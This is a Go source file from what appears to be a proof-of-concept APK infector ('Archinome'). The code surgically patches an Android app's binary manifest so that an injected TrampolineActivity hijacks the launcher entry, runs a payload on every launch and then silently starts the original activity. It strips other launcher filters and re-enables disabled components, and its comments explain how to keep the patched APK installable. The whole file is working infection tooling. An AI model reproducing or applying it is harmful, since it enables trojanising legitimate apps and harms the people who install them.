package manifest

// Trampoline (entry-activity substitution) injection vector.
//
// Takes over the app's launcher entry: the first *enabled* launcher <activity>
// is renamed to aaaaaaaaaaaa.TrampolineActivity, which runs the payload and then
// relaunches the original entry class. Every other MAIN/LAUNCHER component
// (extra <activity> or <activity-alias>) simply loses its launcher
// <intent-filter>, so exactly one launcher entry survives — the trampoline.
//
// The original entry class is passed in the meta-data *key*
// ("archinome.target:<fqcn>"), not in android:value: an AXML attribute name is
// a string-pool index and the resource map is indexed by that same number, so
// an attribute whose name string is not already covered by the host resource
// map cannot be introduced — the platform then rejects the APK at install time
// ("<activity-alias> does not specify android:targetActivity") even though the
// file looks self-consistent to aapt2. For the same reason no <activity-alias>
// is synthesised for extra launchers.
//
// Runtime flow: launcher icon -> TrampolineActivity.onCreate -> payload ->
// startActivity(original) -> finish(). The payload therefore runs on every cold
// launch, without touching android:name on <application> or any class in the
// original dex. The original entry class is re-declared as a non-launcher
// <activity> (attributes preserved) so it stays startable by explicit intent.
//
// The patch is pure binary AXML surgery (same approach as PatchProvider):
//   1. append strings (trampoline class, "meta-data", "archinome.target:<fqcn>"
//      per distinct entry class, each class FQN) to the string pool
//   2. rename the host launcher <activity>'s android:name to the trampoline
//      class and insert <meta-data>...</meta-data> as its first child
//   3. delete the launcher <intent-filter> of every other launcher component
//   4. re-declare the consumed entry class as a non-launcher <activity> after
//      <application>
//   5. fix the AXML total size

import (
	"encoding/binary"
	"log"
	"os"
	"sort"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/internal/utils"
)

const (
	trampolineClassName = "aaaaaaaaaaaa.TrampolineActivity"
	metaDataTagStr      = "meta-data"
	metaDataKey         = "archinome.target"
	activityAliasStr    = "activity-alias"
	aliasNameSuffix     = "ArchinomeAlias"

	resIDValue          = 0x01010024
	resIDTargetActivity = 0x01010202
	resIDEnabled        = 0x0101000e

	actionMainStr       = "android.intent.action.MAIN"
	categoryLauncherStr = "android.intent.category.LAUNCHER"
)

// ------------------------------------------------------------- element parsing

type xmlAttr struct {
	off      int
	ns       uint32
	name     uint32 // resource-map index, or string index if >= len(resIds)
	rawValue uint32
	dataType uint8
	data     uint32
}

type xmlElem struct {
	nameIdx  uint32
	startOff int
	endOff   int // just past matching end tag
}

// elementAttrs returns the attributes of the tag-start chunk at off.
func elementAttrs(data []byte, off int) []xmlAttr {
	attrStart := int(leU16(data, off+24))
	attrSize := int(leU16(data, off+26))
	attrCount := int(leU16(data, off+28))
	base := off + 16 + attrStart
	attrs := make([]xmlAttr, attrCount)
	for i := 0; i < attrCount; i++ {
		a := base + i*attrSize
		attrs[i] = xmlAttr{a, leU32(data, a), leU32(data, a+4), leU32(data, a+8), data[a+15], leU32(data, a+16)}
	}
	return attrs
}

// findAttrByResID returns the attribute whose name resolves to resID.
func findAttrByResID(data []byte, off int, resIds []uint32, resID uint32) (xmlAttr, bool) {
	for _, a := range elementAttrs(data, off) {
		if int(a.name) < len(resIds) && resIds[a.name] == resID {
			return a, true
		}
	}
	return xmlAttr{}, false
}

func attrStringValue(pool *stringPool, data []byte, a xmlAttr) string {
	if a.dataType == 0x03 {
		return pool.decode(data, int(a.data))
	}
	return pool.decode(data, int(a.rawValue))
}

// skipElement returns the offset just past the matching end tag of the
// tag-start chunk at off.
func skipElement(data []byte, off int) int {
	size := int(leU32(data, off+4))
	cursor := off + size
	for cursor+8 <= len(data) {
		t := leU16(data, cursor)
		sz := int(leU32(data, cursor+4))
		if sz < 8 || cursor+sz > len(data) {
			return len(data)
		}
		if t == chunkTagEnd {
			return cursor + sz
		}
		if t == chunkTagStart {
			cursor = skipElement(data, cursor)
		} else {
			cursor += sz
		}
	}
	return len(data)
}

// childElements returns the direct child elements of the tag-start at off.
func childElements(data []byte, off int) []xmlElem {
	var out []xmlElem
	size := int(leU32(data, off+4))
	cursor := off + size
	for cursor+8 <= len(data) {
		t := leU16(data, cursor)
		sz := int(leU32(data, cursor+4))
		if sz < 8 || cursor+sz > len(data) {
			break
		}
		if t == chunkTagEnd {
			break
		}
		if t == chunkTagStart {
			out = append(out, xmlElem{nameIdx: leU32(data, cursor+20), startOff: cursor, endOff: skipElement(data, cursor)})
			cursor = out[len(out)-1].endOff
		} else {
			cursor += sz
		}
	}
	return out
}

func elementName(pool *stringPool, data []byte, e xmlElem) string {
	return pool.decode(data, int(e.nameIdx))
}

// firstTagStart returns the offset of the first tag-start chunk (the <manifest>
// root).
func firstTagStart(data []byte) int {
	for off := 8; off+8 <= len(data); {
		t := leU16(data, off)
		sz := int(leU32(data, off+4))
		if sz < 8 || off+sz > len(data) {
			break
		}
		if t == chunkTagStart {
			return off
		}
		off += sz
	}
	return -1
}

// isLauncherFilter reports whether the <intent-filter> element is a
// MAIN/LAUNCHER filter.
func isLauncherFilter(data []byte, pool *stringPool, resIds []uint32, filter xmlElem) bool {
	hasMain, hasLauncher := false, false
	for _, ifc := range childElements(data, filter.startOff) {
		tag := elementName(pool, data, ifc)
		a, ok := findAttrByResID(data, ifc.startOff, resIds, resIDName)
		if !ok {
			continue
		}
		val := attrStringValue(pool, data, a)
		if tag == "action" && val == actionMainStr {
			hasMain = true
		}
		if tag == "category" && val == categoryLauncherStr {
			hasLauncher = true
		}
	}
	return hasMain && hasLauncher
}

// launcherFilter returns the MAIN/LAUNCHER <intent-filter> child of the
// component at off, if any.
func launcherFilter(data []byte, pool *stringPool, resIds []uint32, off int) *xmlElem {
	for _, child := range childElements(data, off) {
		if elementName(pool, data, child) != "intent-filter" {
			continue
		}
		if isLauncherFilter(data, pool, resIds, child) {
			return &child
		}
	}
	return nil
}

// disabledAttr returns the android:enabled attribute of the component at off
// when it is explicitly false (hidden launchers are toggled at runtime).
func disabledAttr(data []byte, off int, resIds []uint32) (xmlAttr, bool) {
	a, ok := findAttrByResID(data, off, resIds, resIDEnabled)
	if !ok {
		return xmlAttr{}, false
	}
	if a.dataType == 0x12 && a.data == 0 {
		return a, true
	}
	return xmlAttr{}, false
}

// hasLauncherFilter reports whether the component tag at off contains an
// <intent-filter> with a MAIN action and a LAUNCHER category.
func hasLauncherFilter(data []byte, pool *stringPool, resIds []uint32, off int) bool {
	return launcherFilter(data, pool, resIds, off) != nil
}

// launcherComponent describes one MAIN/LAUNCHER component under <application>.
type launcherComponent struct {
	startOff   int
	isActivity bool
	entryAttr  xmlAttr // android:name (activity) or android:targetActivity (alias)
	origTarget string  // resolved FQN of the original entry class
}

// findLauncherComponents returns every <activity> and <activity-alias> under
// <application> that carries a MAIN/LAUNCHER intent-filter. entryAttr is the
// attribute to rename so the component routes through the trampoline.
func findLauncherComponents(data []byte, pool *stringPool, resIds []uint32, pkg string) []launcherComponent {
	root := firstTagStart(data)
	if root < 0 {
		return nil
	}
	var appOff = -1
	for _, c := range childElements(data, root) {
		if elementName(pool, data, c) == "application" {
			appOff = c.startOff
			break
		}
	}
	if appOff < 0 {
		return nil
	}

	var out []launcherComponent
	for _, c := range childElements(data, appOff) {
		name := elementName(pool, data, c)
		if name != "activity" && name != "activity-alias" {
			continue
		}
		if !hasLauncherFilter(data, pool, resIds, c.startOff) {
			continue
		}
		lc := launcherComponent{startOff: c.startOff, isActivity: name == "activity"}
		if lc.isActivity {
			a, ok := findAttrByResID(data, c.startOff, resIds, resIDName)
			if !ok {
				continue
			}
			lc.entryAttr = a
			lc.origTarget = resolveClassName(pkg, attrStringValue(pool, data, a))
		} else {
			a, ok := findAttrByResID(data, c.startOff, resIds, resIDTargetActivity)
			if !ok {
				continue
			}
			lc.entryAttr = a
			lc.origTarget = resolveClassName(pkg, attrStringValue(pool, data, a))
		}
		out = append(out, lc)
	}
	return out
}

func resolveClassName(pkg, name string) string {
	if strings.HasPrefix(name, ".") {
		return pkg + name
	}
	if !strings.Contains(name, ".") {
		return pkg + "." + name
	}
	return name
}

// copyAttrsExceptName returns the attributes of the tag at off as elemAttr,
// dropping the android:name attribute.
func copyAttrsExceptName(data []byte, off int, resIds []uint32) []elemAttr {
	var out []elemAttr
	for _, a := range elementAttrs(data, off) {
		if int(a.name) < len(resIds) && resIds[a.name] == resIDName {
			continue
		}
		out = append(out, elemAttr{a.ns, a.name, a.rawValue, a.dataType, a.data})
	}
	return out
}

// ------------------------------------------------------------- chunk builders

type elemAttr struct {
	ns       uint32
	nameIdx  uint32 // resource-map index
	rawIdx   uint32
	dataType uint8
	data     uint32
}

func buildStartTag(tagStrIdx uint32, attrs []elemAttr) []byte {
	n := len(attrs)
	size := uint32(36 + n*20)
	b := make([]byte, size)
	binary.LittleEndian.PutUint16(b[0:], chunkTagStart)
	binary.LittleEndian.PutUint16(b[2:], 0x10)
	binary.LittleEndian.PutUint32(b[4:], size)
	binary.LittleEndian.PutUint32(b[8:], 0)           // lineNumber
	binary.LittleEndian.PutUint32(b[12:], 0xFFFFFFFF) // comment
	binary.LittleEndian.PutUint32(b[16:], 0xFFFFFFFF) // ns
	binary.LittleEndian.PutUint32(b[20:], tagStrIdx)  // element name
	binary.LittleEndian.PutUint16(b[24:], 20)         // attributeStart
	binary.LittleEndian.PutUint16(b[26:], 20)         // attributeSize
	binary.LittleEndian.PutUint16(b[28:], uint16(n))  // attributeCount
	binary.LittleEndian.PutUint16(b[30:], 0)          // idIndex
	binary.LittleEndian.PutUint16(b[32:], 0)          // classIndex
	binary.LittleEndian.PutUint16(b[34:], 0)          // styleIndex
	for i, a := range attrs {
		putAttr(b, 36+i*20, a.ns, a.nameIdx, a.rawIdx, a.dataType, a.data)
	}
	return b
}

func buildEndTag(tagStrIdx uint32) []byte {
	b := make([]byte, 24)
	binary.LittleEndian.PutUint16(b[0:], chunkTagEnd)
	binary.LittleEndian.PutUint16(b[2:], 0x10)
	binary.LittleEndian.PutUint32(b[4:], 24)
	binary.LittleEndian.PutUint32(b[8:], 0)           // lineNumber
	binary.LittleEndian.PutUint32(b[12:], 0xFFFFFFFF) // comment
	binary.LittleEndian.PutUint32(b[16:], 0xFFFFFFFF) // ns
	binary.LittleEndian.PutUint32(b[20:], tagStrIdx)  // element name
	return b
}

// ------------------------------------------------------------- entry point

// PatchTrampoline performs the trampoline patch on the already-dumped binary
// manifest (utils.ManifestBinaryPath) and rewrites it in place.
func PatchTrampoline() {
	data, err := os.ReadFile(utils.ManifestBinaryPath)
	if err != nil {
		log.Panicf("Failed to read %s", utils.ManifestBinaryPath)
	}

	pool := parseStringPool(data)

	androidNs := pool.indexOf(data, androidNamespaceURI)
	if androidNs < 0 {
		log.Panic("android namespace URI not found in string pool")
	}

	pkg := getPackageName()
	if pkg == "" {
		log.Panic("package name not found")
	}

	// resource map
	resMapOff := findChunk(data, chunkResMap)
	if resMapOff < 0 {
		log.Panic("resource map chunk not found")
	}
	resMapSizeOrig := int(leU32(data, resMapOff+4))
	resMapHdr := int(leU16(data, resMapOff+2))
	resMapCount := (resMapSizeOrig - resMapHdr) / 4
	resIds := make([]uint32, resMapCount)
	for i := 0; i < resMapCount; i++ {
		resIds[i] = leU32(data, resMapOff+8+i*4)
	}
	nameResIdx := indexOfU32(resIds, resIDName)
	if nameResIdx < 0 {
		log.Panic("'name' attribute resource id not found in resource map")
	}
	// resource-map slots that have to be filled/appended for attribute names
	// this patch introduces (see attrName below)
	needIDAt := map[int]uint32{}
	// AXML attribute names are *string-pool* indices and the resource map is
	// indexed by that very number, so an attribute name can only be introduced
	// by landing its string at the index the map gets extended to (which is why
	// the resolver below appends the st...[truncated]

	// launcher components
	comps := findLauncherComponents(data, pool, resIds, pkg)
	if len(comps) == 0 {
		log.Panic("no MAIN/LAUNCHER activity or activity-alias found")
	}

	// distinct original targets (FQN), first-seen order
	var targets []string
	seen := map[string]bool{}
	for _, c := range comps {
		if !seen[c.origTarget] {
			seen[c.origTarget] = true
			targets = append(targets, c.origTarget)
		}
	}

	// strings appended at indices stringCount..stringCount+N-1
	var newStrings []string
	addStr := func(s string) uint32 {
		if idx := pool.indexOf(data, s); idx >= 0 {
			return uint32(idx)
		}
		i := uint32(pool.stringCount + len(newStrings))
		newStrings = append(newStrings, s)
		return i
	}
	trampolineClassIdx := addStr(trampolineClassName)

	// append without deduplication — used when the pool already holds the
	// wanted text at a slot that carries a different attribute resource id
	addStrRaw := func(s string) uint32 {
		i := uint32(pool.stringCount + len(newStrings))
		newStrings = append(newStrings, s)
		return i
	}
	// attrName resolves the pool index to use as an attribute name for `name`
	// (resource id `resID`), recording the resource-map slot to fill in: the
	// name string must sit at exactly the index the map is extended to, or the
	// platform sees an attribute without a name ("<activity-alias> does not
	// specify android:targetActivity").
	attrName := func(name string, resID uint32) uint32 {
		idx := int(addStr(name))
		if idx < len(resIds) && resIds[idx] != 0 && resIds[idx] != resID {
			idx = int(addStrRaw(name))
		}
		if idx >= len(resIds) || resIds[idx] == 0 {
			needIDAt[idx] = resID
		}
		return uint32(idx)
	}
	valueResIdx := attrName("value", resIDValue)
	metaTagIdx := addStr(metaDataTagStr)
	metaKeyIdx := addStr(metaDataKey)
	classIdx := make(map[string]uint32, len(targets))
	for _, t := range targets {
		classIdx[t] = addStr(t)
	}

	actTagIdx := pool.indexOf(data, "activity")
	if actTagIdx < 0 {
		log.Panic("'activity' string not found")
	}

	// host: the first launcher <activity> that is not disabled in the manifest
	// (hidden launchers ship android:enabled="0" and are toggled at runtime; a
	// disabled host would leave the app without a working launcher icon)
	hostIdx := -1
	for i, c := range comps {
		if !c.isActivity {
			continue
		}
		if _, disabled := disabledAttr(data, c.startOff, resIds); !disabled {
			hostIdx = i
			break
		}
	}
	if hostIdx < 0 {
		for i, c := range comps {
			if c.isActivity {
				hostIdx = i
				break
			}
		}
	}

	// encode appended strings
	oldDataSize := pool.size - pool.stringsStart
	var newOffsetBytes, newStringBytes []byte
	acc := oldDataSize
	for _, s := range newStrings {
		enc := encodeString(pool.flags, s)
		newOffsetBytes = append(newOffsetBytes, u32bytes(uint32(acc))...)
		newStringBytes = append(newStringBytes, enc...)
		acc += len(enc)
	}
	newStringCount := pool.stringCount + len(newStrings)
	newStringsStart := pool.stringsStart + len(newStrings)*4
	newPoolSize := pool.size + len(newOffsetBytes) + len(newStringBytes)
	if pad := (4 - newPoolSize%4) % 4; pad != 0 {
		newStringBytes = append(newStringBytes, make([]byte, pad)...)
		newPoolSize += pad
	}

	// meta-data element builder: android:name (key) + android:value (original
	// entry class). The installer rejects a <meta-data> without value/resource,
	// so the key-only encoding cannot be used.
	buildMeta := func(valIdx uint32) []byte {
		start := buildStartTag(metaTagIdx, []elemAttr{
			{uint32(androidNs), uint32(nameResIdx), metaKeyIdx, 0x03, metaKeyIdx},
			{uint32(androidNs), uint32(valueResIdx), valIdx, 0x03, valIdx},
		})
		return append(start, buildEndTag(metaTagIdx)...)
	}

	// locate <application> start tag (insertion point for re-declarations)
	appStrIdx := pool.indexOf(data, "application")
	if appStrIdx < 0 {
		log.Panic("'application' string not found")
	}
	appInsertOff := -1
	for off := 8; off+8 <= len(data); {
		t := leU16(data, off)
		sz := int(leU32(data, off+4))
		if sz < 8 || off+sz > len(data) {
			break
		}
		if t == chunkTagStart && int(leU32(data, off+20)) == appStrIdx {
			appInsertOff = off + sz
			break
		}
		off += sz
	}
	if appInsertOff < 0 {
		log.Panic("application start tag not found")
	}

	type edit struct {
		off int
		del int
		val []byte
	}
	var edits []edit

	// --- pool header + appended data ---
	edits = append(edits,
		edit{pool.off + 4, 4, u32bytes(uint32(newPoolSize))},
		edit{pool.off + 8, 4, u32bytes(uint32(newStringCount))},
		edit{pool.off + 20, 4, u32bytes(uint32(newStringsStart))},
		edit{pool.off + 28 + pool.stringCount*4, 0, newOffsetBytes},
		edit{pool.off + pool.size, 0, newStringBytes},
	)

	// --- resource map: resource ids for attribute names introduced above ---
	if len(needIDAt) > 0 {
		newResMapCount := resMapCount
		for idx := range needIDAt {
			if idx+1 > newResMapCount {
				newResMapCount = idx + 1
			}
		}
		for idx, id := range needIDAt {
			if idx < resMapCount {
				// free slot inside the existing map: fill it in place
				edits = append(edits, edit{resMapOff + 8 + idx*4, 4, u32bytes(id)})
			}
		}
		if grow := newResMapCount - resMapCount; grow > 0 {
			block := make([]byte, grow*4)
			for idx, id := range needIDAt {
				if idx >= resMapCount {
					block[(idx-resMapCount)*4] = byte(id)
					block[(idx-resMapCount)*4+1] = byte(id >> 8)
					block[(idx-resMapCount)*4+2] = byte(id >> 16)
					block[(idx-resMapCount)*4+3] = byte(id >> 24)
				}
			}
			edits = append(edits,
				edit{resMapOff + 4, 4, u32bytes(uint32(resMapSizeOrig + len(block)))},
				edit{resMapOff + resMapSizeOrig, 0, block},
			)
		}
	}

	// aliasHost marks an <activity-alias> that was retargeted at the trampoline
	// (alias-only launchers); its MAIN/LAUNCHER filter must survive the strip
	// pass below, because that alias IS the launcher entry of the patched app.
	aliasHost := -1

	// --- host component: becomes the trampoline ---
	if hostIdx >= 0 {
		host := comps[hostIdx]
		// rename the host activity -> trampoline
		edits = append(edits,
			edit{host.entryAttr.off + 8, 4, u32bytes(trampolineClassIdx)},
			edit{host.entryAttr.off + 16, 4, u32bytes(trampolineClassIdx)},
		)
		// a host disabled in the manifest would be invisible to the launcher
		if a, disabled := disabledAttr(data, host.startOff, resIds); disabled {
			edits = append(edits, edit{a.off + 16, 4, u32bytes(1)})
		}
		// meta-data as first child
		edits = append(edits, edit{host.startOff + int(leU32(data, host.startOff+4)), 0, buildMeta(classIdx[host.origTarget])})
	} else {
		// Alias-only launchers: every MAIN/LAUNCHER component under <application>
		// is an <activity-alias> (Fossify's themed icons, Organic Maps), so there
		// is no <activity> to rename. Retarget one launcher alias at the
		// trampoline and declare the trampoline as a plain <activity> with NO
		// intent-filter:
		//   * the alias keeps its own icon/label, so the patched app still shows
		//     exactly one launcher entry, and an activity without an intent-filter
		//     needs no android:exported - the platform rejects a targetSdk>=31 APK
		//     with INSTALL_PARSE_FAILED_MANIFEST_MALFORMED otherwise;
		//   * synthesising an activity that carries a copy of the alias' filter
		//     (what this used to do) both lost the icon and hit exactly that
		//     rejection.
		// Prefer an alias the host enables itself, because a disabled alias is not
		// a launcher entry at all.
		pick := 0
		for i, c := range comps {
			if c.isActivity {
				continue
			}
			pick = i
			if _, disabled := disabledAttr(data, c.startOff, resIds); !disabled {
				break
			}
		}
		if comps[pick].isActivity {
			log.Panicf("trampoline: launcher activity %s has no host slot", comps[pick].origTarget)
		}
		host := comps[pick]
		newAct := buildStartTag(uint32(actTagIdx), []elemAttr{
			{uint32(androidNs), uint32(nameResIdx), trampolineClassIdx, 0x03, trampolineClassIdx},
		})
		newAct = append(newAct, buildMeta(classIdx[host.origTarget])...)
		newAct = append(newAct, buildEndTag(uint32(actTagIdx))...)
		edits = append(edits, edit{appInsertOff, 0, newAct})
		// entryAttr of an alias is its android:targetActivity: point it at the
		// trampoline so the launcher routes through the payload and the original
		// activity is launched from the meta-data above.
		// Both the raw and the typed string slot must be rewritten: the platform
		// reads typedValue.data (+16), aapt2 only rebuilds rawValue (+8), so
		// writing one without the other silently retargets nothing.
		edits = append(edits, edit{host.entryAttr.off + 8, 4, u32bytes(trampolineClassIdx)})
		edits = append(edits, edit{host.entryAttr.off + 16, 4, u32bytes(trampolineClassIdx)})
		if a, disabled := disabledAttr(data, host.startOff, resIds); disabled {
			edits = append(edits, edit{a.off + 16, 4, u32bytes(1)})
		}
		aliasHost = host.startOff
		aliasName := ""
		if na, ok := findAttrByResID(data, host.startOff, resIds, resIDName); ok {
			aliasName = attrStringValue(pool, data, na)
		}
		log.Printf("Trampoline: launcher alias %s retargeted at %s (launches %s)",
			aliasName, trampolineClassName, host.origTarget)
	}

	// --- every other launcher component loses its MAIN/LAUNCHER filter ---
	// No <activity-alias> is synthesised for extra launchers: an alias needs
	// android:targetActivity, whose name string is usually absent from the host
	// resource map, and the platform then refuses to install the APK.
	for i, c := range comps {
		if i == hostIdx || c.startOff == aliasHost {
			continue
		}
		for _, ch := range childElements(data, c.startOff) {
			if elementName(pool, data, ch) != "intent-filter" || !isLauncherFilter(data, pool, resIds, ch) {
				continue
			}
			edits = append(edits, edit{ch.startOff, ch.endOff - ch.startOff, nil})
		}
	}

	// --- re-declare the consumed host class as a non-launcher <activity> so it
	// stays declared and startable by explicit intent (its launcher filter now
	// lives on the trampoline) ---
	if hostIdx >= 0 {
		host := comps[hostIdx]
		attrs := copyAttrsExceptName(data, host.startOff, resIds)
		attrs = append([]elemAttr{{uint32(androidNs), uint32(nameResIdx), classIdx[host.origTarget], 0x03, classIdx[host.origTarget]}}, attrs...)
		for i := range attrs {
			if int(attrs[i].nameIdx) < len(resIds) && resIds[attrs[i].nameIdx] == resIDEnabled && attrs[i].dataType == 0x12 {
				attrs[i].data = 1
			}
		}
		newAct := append(buildStartTag(uint32(actTagIdx), attrs), buildEndTag(uint32(actTagIdx))...)
		edits = append(edits, edit{appInsertOff, 0, newAct})
	}

	// --- total size ---
	newTotal := len(data)
	for _, e := range edits {
		newTotal += len(e.val) - e.del
	}
	edits = append(edits, edit{axmlSizeOff, 4, u32bytes(uint32(newTotal))})

	sort.SliceStable(edits, func(i, j int) bool { return edits[i].off < edits[j].off })

	out := make([]byte, 0, newTotal)
	cursor := 0
	for _, e := range edits {
		out = append(out, data[cursor:e.off]...)
		out = append(out, e.val...)
		cursor = e.off + e.del
	}
	out = append(out, data[cursor:]...)

	utils.WriteChanges(out, utils.ManifestBinaryPath)
	log.Printf("Trampoline injected: %d launcher component(s) -> %s, manifest size 0x%x -> 0x%x",
		len(comps), trampolineClassName, len(data), len(out))
}
